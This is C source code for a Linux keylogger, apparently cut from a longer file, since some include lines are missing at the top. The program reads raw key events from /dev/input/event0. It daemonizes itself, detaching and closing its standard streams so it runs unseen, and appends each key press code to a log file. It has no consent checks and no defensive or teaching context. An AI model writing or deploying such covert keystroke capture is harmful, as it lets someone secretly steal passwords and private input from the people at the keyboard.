#include <string.h>
#include <errno.h>

#define LOG_FILE "/workspace/logs/keystrokes.log"
#define INPUT_DEVICE "/dev/input/event0"  // Adjust this to the correct event file

void log_keystroke(const char *keystroke) {
    FILE *log_file = fopen(LOG_FILE, "a");
    if (log_file == NULL) {
        perror("Failed to open log file");
        exit(EXIT_FAILURE);
    }
    fprintf(log_file, "%s", keystroke);
    fclose(log_file);
}

int main() {
    int fd;
    struct input_event ev;

    // Open the input device
    fd = open(INPUT_DEVICE, O_RDONLY);
    if (fd == -1) {
        perror("Failed to open input device");
        return EXIT_FAILURE;
    }

    // Daemonize the process
    if (fork() != 0) {
        return 0; // Parent exits
    }
    setsid();
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    // Monitor keystrokes
    while (1) {
        if (read(fd, &ev, sizeof(struct input_event)) == -1) {
            perror("Failed to read input event");
            close(fd);
            return EXIT_FAILURE;
        }

        if (ev.type == EV_KEY && ev.value == 1) { // Key press event
            char keystroke[16];
            snprintf(keystroke, sizeof(keystroke), "Key %d\n", ev.code);
            log_keystroke(keystroke);
        }
    }

    close(fd);
    return EXIT_SUCCESS;
}

